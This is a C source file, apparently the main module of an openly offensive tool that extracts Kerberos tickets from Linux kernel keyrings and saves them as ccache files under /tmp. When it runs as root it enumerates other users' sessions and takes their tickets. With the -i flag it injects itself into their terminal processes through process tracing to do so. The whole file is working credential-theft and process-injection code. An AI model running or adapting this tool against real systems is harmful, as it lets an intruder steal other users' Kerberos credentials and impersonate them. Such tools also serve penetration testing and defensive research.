// Author: Eloy Perez (https://github.com/Zer1t0)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#include "string_utils.h"
#include "tickets.h"
#include "krb_conf.h"
#include "user_session.h"
#include "proc_info/proc_info.h"
#include "traceter/traceter.h"

#define KEYRING_PERSISTENT 1

void extract_tickets_from_keyring();

char * current_filepath = NULL;
bool silent = false;
bool inject = false;
bool verbose = false;
char * prefix_filename = "/tmp/__krb";
ccache_info_t * ccache_info = NULL;

#define print(...) if(!silent) printf(__VA_ARGS__)
#define print_verbose(...) if(verbose) print(__VA_ARGS__)

void parse_options(int argc, char * const argv[]) {
    int option_index = 0;
    while((option_index = getopt(argc, argv, ":siv")) != -1){
        switch(option_index){
            case 's':
                silent = true;
                break;
            case 'i':
                inject = true;
                break;
            case 'v':
                verbose = true;
                break;
            default:
                break;
        }
    }
}

int main(int argc, char * const argv[]){
    parse_options(argc, argv);
    
    process_using_tty("pts/2");
    
    current_filepath = realpath(argv[0], NULL);
    print_verbose("[*] Current path = %s\n", current_filepath);
	ccache_info = krb5_ccache_info(); 
	if(ccache_info == NULL){
		print("[X] Unable to determine krb5 configuration\n");
		return 1;
	}

	print("[*] krb5 ccache_name = %s:%s:%s\n", ccache_info->type, ccache_info->subtype, ccache_info->name);	

	if (strcmp(ccache_info->type, "FILE") == 0){
		print("[*] Tickets should be in %s\n", ccache_info->name);
	}
	else if(strcmp(ccache_info->type, "KEYRING") == 0){
		extract_tickets_from_keyring(ccache_info);
	}
	else {
		print("[X] Unknown ccache type %s\n", ccache_info->type);
	}
	
	free(ccache_info); ccache_info = NULL;
	free(current_filepath); current_filepath = NULL;
    
	return 0;
}

char * replace_uid_in_key_name(const char * key_name, uid_t uid){
	char * uid_str = NULL;
	asprintf(&uid_str, "%u", uid);
	if(uid_str == NULL){
		return NULL;
	}
	char * key_uid_name = areplace(key_name, "%{uid}", uid_str);
	free(uid_str); uid_str = NULL;
	return key_uid_name;	
}

#define IS_PERSISTENT_KEYRING(key_type) (strcmp(key_type, "persistent") == 0)

tickets_t * get_keyring_tickets(const char * key_type, const char * key_name, uid_t uid){
	if(strcmp(key_type, "persistent") == 0){
		return get_tickets_from_user_persistent_key(uid);
	}

	char * key_uid_name = replace_uid_in_key_name(key_name, uid);
	if(key_uid_name == NULL){
		return NULL;
	}
	tickets_t *tickets = get_tickets_from_named_key(key_type, key_uid_name);
	free(key_uid_name);key_uid_name = NULL;
	return tickets;
}


void extract_tickets_from_user_keyring(const char * output_filename, uid_t uid){
	tickets_t * tickets = get_keyring_tickets(ccache_info->subtype, ccache_info->name, uid);
	if(tickets == NULL){
		print("[X] [uid:%u] Error retrieving tickets\n", uid);
		goto close;
	}

	print("[*] [uid:%u] %zx tickets found\n", uid, tickets->length);


	int ok = write_tickets_to_ccache(tickets, output_filename);  
	if(ok == -1){
		print("[X] [uid:%u] Error writing tickets into %s\n", uid, output_filename);
		goto close;
	}
	
	print("[+] [uid:%u] Tickets written into %s\n", uid, output_filename);

close:
	if(tickets){
		destroy_tickets(&tickets);
	}
}

void extract_tickets_from_user_keyring_to_uid_file(uid_t uid){
	char * out_uid_filename = NULL;	
	asprintf(&out_uid_filename, "%s_%u.ccache", prefix_filename, uid);
	extract_tickets_from_user_keyring(out_uid_filename, uid);
	free(out_uid_filename);
}

int inject_in_process(pid_t pid){
    trace_session_t * session = init_forked_trace_session(pid);
    if(session == NULL){
        return -1;
    }
    
    char * argv[] = {current_filepath, "-s", NULL};
    char * envp[] = {NULL};
    int ok = exec_execve_from_local(session, current_filepath, argv, envp);
    if(ok == -1){
        send_signal(session, SIGKILL);
    }
    
    terminate_session(&session);
    return ok;
}

void inject_in_user_session(user_session_t* user_session){
    print("[*] Trying to inject in %s[%d] session...\n", 
            user_session->username, user_session->uid);
    process_info_t* process_info = process_using_tty(user_session->terminal);
    if(process_info == NULL || process_info->euid != user_session->uid){
        print("[-] Unable to find process of user for session %s[%d] "
                "with terminal %s\n",
                user_session->username, user_session->uid, 
                user_session->terminal);
        goto close;
    }
    
    if(inject_in_process(process_info->pid) != -1){
        print("[+] Successful injection at process %d of %s[%d],look for "
                "tickets in %s_%u.ccache\n", 
                process_info->pid, user_session->username, user_session->uid, 
                prefix_filename, user_session->uid);
    }else{
        print("[-] Failed injection at process %d of %s[%d] "
                "(make sure of letting this binary in a folder "
                "reachable by all users like /tmp)\n", 
                process_info->pid, user_session->username, user_session->uid);
    }
    
close:
    if(process_info){
        free(process_info); process_info = NULL;
    }
    return;
}

void extract_non_persistent_keyring_tickets_for_other_accounts(){
    uid_t current_uid = getuid();
    
    users_sessions_list_t * users = users_sessions();
    if(users){
        size_t i = 0;
        for(i = 0; i < users->length; i++){
            user_session_t *user = users->users[i];
            if(user->uid == current_uid){
                continue;
            }
            inject_in_user_session(users->users[i]);
        }
    }
    release_users_sessions_list(&users);
}

void extract_persistent_keyring_tickets_for_other_accounts(){
    uid_t current_uid = getuid();
    
    users_sessions_list_t * users = users_sessions();
    if(users){
        size_t i = 0;
        for(i = 0; i < users->length; i++){
            user_session_t *user = users->users[i];
            if(user->uid == current_uid){
                continue;
            }
            extract_tickets_from_user_keyring_to_uid_file(user->uid);
        }
    }
    release_users_sessions_list(&users);
}

void extract_tickets_for_other_accounts(){
    if(IS_PERSISTENT_KEYRING(ccache_info->subtype)){
        extract_persistent_keyring_tickets_for_other_accounts();
    }else if(inject){
        extract_non_persistent_keyring_tickets_for_other_accounts();
    }else{
        print("[-] Injection required to extract other users tickets, try with -i\n");
    }
}

void extract_tickets_from_keyring(){
	uid_t current_uid = getuid();

	if(current_uid == 0){
		print("[+] root detected, so... DUMP ALL THE TICKETS!!\n");
		extract_tickets_for_other_accounts();
	}
    
	extract_tickets_from_user_keyring_to_uid_file(current_uid);
}
